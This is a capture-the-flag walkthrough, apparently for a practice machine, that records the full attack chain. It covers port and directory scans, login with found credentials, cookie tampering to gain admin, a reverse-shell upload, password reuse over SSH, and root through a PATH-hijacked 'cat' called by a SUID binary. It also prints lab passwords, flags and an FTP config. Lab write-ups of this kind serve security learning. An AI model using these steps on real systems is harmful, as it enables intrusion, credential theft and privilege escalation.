## Oppsie 
 > export IP = 10.10.10.28
 
## nmap scans
 > sudo nmap -sS -A 10.10.10.28

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
	|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
	|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

AS WE CAN SEE THERE IS APACHE SERVER RUNNING ON PORT 80, AND OPEN SSH PORT 22. NOW WE WILL LOOK FOR ALL THE DIRECTORIES AT THE PORT 80 THAT COULD BE RUNNING.

## GoBuster Scans
gobuster dir -x "php, json, txt, html, css, xml, js" -u "http://$IP/" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 2> /dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,json,txt,html,css,xml,js
[+] Timeout:                 10s
===============================================================
2021/09/29 10:22:44 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.28/images/]
/index.php            (Status: 200) [Size: 10932]                               
/themes               (Status: 301) [Size: 311] [--> http://10.10.10.28/themes/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.28/uploads/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.28/css/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.28/js/]     
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.28/fonts/] 


## Nikto Scan
See Nikto.log

found http://$IP/cdn-cgi/login/

Used Credentials:
	username: admin
	pw: MEGACORP_4dm1n!!


We found an email address in the index page for the admin: admin@megacorp.com. Might be useful later on.


Once logged in under accounts it is visible that we've got access to all the account ids, email and usernames. Hence we run a script account_enum.py

SUPER ADMIN FOUND UNDER ID=30

ACC ID 	USERNAME 		EMAIL

86575	super admin 	superadmin@megacorp.com

Once changed our cookies, was able to access the uploads  page in the management section as Super Admin

Uploaded reverseShell.php thorugh the upload form

was able to exec the scrpt through http://$IP/uploads/ page

we are in as www-data user


Found Creds: /var/www/htmlcdn-cgi/login/db.php
robert
M3g4C0rpUs3r!
garage


SSH'd with credentials above ^ and found user.txt file
f2c74ee8db7983851ab2a96a44eb7981


> id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)

there is a group of users bugtracker 

> find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker

We found a file bugtracker, once checked all the lines of the file (string bugtracker) we can see that it contains a cat line which accesses stuff from root. 

> cd tmp
> echo /bin/bash > cat

What can we do? When run which cat, we can see that /bin/cat comes up. that is the location where cat command is run from. What we have to do is make sure we run cat file we just created before the /bin/ one 

> echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

Hence:

> export PATH=/home/robert/tmp:$PATH
> echo $PATH
/home/robert/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


If we run which cat now, we would expect /home/robert/tmp/cat, however, when we run it now we still see /bin/cat

That is because we have to change file mode and make executable

> chmod +x cat
> which cat
/home/robert/tmp/cat

If we execute bugtracker file now, it will give us root access

> bugtracker
.. and we have root access

af13b0bee69f8a877c3faf667f7beacf


<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>


